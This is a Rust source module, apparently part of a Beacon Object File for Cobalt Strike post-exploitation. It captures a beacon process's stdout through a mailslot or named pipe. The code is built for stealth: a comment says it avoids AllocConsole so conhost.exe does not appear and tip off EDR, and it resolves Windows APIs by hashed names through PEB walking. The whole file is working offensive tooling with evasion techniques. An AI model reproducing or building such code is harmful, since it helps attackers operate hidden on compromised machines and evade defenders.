use crate::error::BofError;
use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::hash;

use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING, ReadFile,
};
use windows_sys::Win32::System::Console::{
    GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE,
};
use windows_sys::Win32::System::Mailslots::{CreateMailslotA, GetMailslotInfo};
use windows_sys::Win32::System::Pipes::CreateNamedPipeA;

pub struct IoChannel {
    mode: Mode,
    handle: HANDLE,
    write_handle: HANDLE,
    saved_stdout: HANDLE,
}

enum Mode {
    Mailslot,
    Pipe,
}

impl IoChannel {
    pub unsafe fn open(use_mailslot: bool, slot: &str, pipe: &str) -> Result<Self, BofError> {
        unsafe {
            let (handle, write_handle, mode) = if use_mailslot {
                let path = format_path(b"\\\\.\\mailslot\\", slot.as_bytes());
                let h = CreateMailslotA(path.as_ptr(), 0, 0xFFFFFFFF, core::ptr::null());
                if h == INVALID_HANDLE_VALUE {
                    return Err(BofError::Io {
                        last_error: get_last_error(),
                        op: "i1",
                    });
                }
                let w = CreateFileA(
                    path.as_ptr(),
                    GENERIC_WRITE,
                    FILE_SHARE_READ,
                    core::ptr::null(),
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    core::ptr::null_mut(),
                );
                (h, w, Mode::Mailslot)
            } else {
                let path = format_path(b"\\\\.\\pipe\\", pipe.as_bytes());
                let h = CreateNamedPipeA(
                    path.as_ptr(),
                    0x00000003,
                    0x00000004,
                    255,
                    65535,
                    65535,
                    0,
                    core::ptr::null(),
                );
                if h == INVALID_HANDLE_VALUE {
                    return Err(BofError::Io {
                        last_error: get_last_error(),
                        op: "i2",
                    });
                }
                let w = CreateFileA(
                    path.as_ptr(),
                    GENERIC_WRITE,
                    FILE_SHARE_READ,
                    core::ptr::null(),
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    core::ptr::null_mut(),
                );
                (h, w, Mode::Pipe)
            };

            // No AllocConsole — that spawns conhost.exe (visible child process,
            // EDR-detectable, can trigger CS spawnto-injected new beacon
            // callbacks). SetStdHandle alone is sufficient: Console.WriteLine
            // writes to the redirected stdout HANDLE; no console WINDOW needed.
            let saved_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
            SetStdHandle(STD_OUTPUT_HANDLE, write_handle);

            Ok(IoChannel {
                mode,
                handle,
                write_handle,
                saved_stdout,
            })
        }
    }

    pub unsafe fn drain(&self) -> Result<String, BofError> {
        unsafe {
            let mut out = Vec::with_capacity(65536);
            let mut buf = [0u8; 4096];
            match self.mode {
                Mode::Mailslot => loop {
                    let mut next_size: u32 = 0;
                    let mut count: u32 = 0;
                    GetMailslotInfo(
                        self.handle,
                        core::ptr::null_mut(),
                        &mut next_size,
                        &mut count,
                        core::ptr::null_mut(),
                    );
                    if count == 0 || next_size == 0xFFFFFFFF {
                        break;
                    }
                    let mut read = 0u32;
                    ReadFile(
                        self.handle,
                        buf.as_mut_ptr(),
                        buf.len() as u32,
                        &mut read,
                        core::ptr::null_mut(),
                    );
                    out.extend_from_slice(&buf[..read as usize]);
                },
                Mode::Pipe => {
                    let mut read = 0u32;
                    ReadFile(
                        self.handle,
                        buf.as_mut_ptr(),
                        buf.len() as u32,
                        &mut read,
                        core::ptr::null_mut(),
                    );
                    out.extend_from_slice(&buf[..read as usize]);
                }
            }
            Ok(String::from_utf8_lossy(&out).into_owned())
        }
    }
}

impl Drop for IoChannel {
    fn drop(&mut self) {
        unsafe {
            SetStdHandle(STD_OUTPUT_HANDLE, self.saved_stdout);
            CloseHandle(self.write_handle);
            CloseHandle(self.handle);
        }
    }
}

fn format_path(prefix: &[u8], suffix: &[u8]) -> Vec<u8> {
    let mut v = Vec::with_capacity(prefix.len() + suffix.len() + 1);
    v.extend_from_slice(prefix);
    v.extend_from_slice(suffix);
    v.push(0);
    v
}

unsafe fn get_last_error() -> u32 {
    unsafe {
        type Fn = unsafe extern "system" fn() -> u32;
        if let Some(k32) = resolve_module(hash!("kernel32.dll")) {
            if let Some(p) = resolve_export(k32, hash!("GetLastError")) {
                let f: Fn = core::mem::transmute(p);
                return f();
            }
        }
        0
    }
}

#[allow(dead_code)]
fn _force_link_c_void(_: *mut c_void) {}
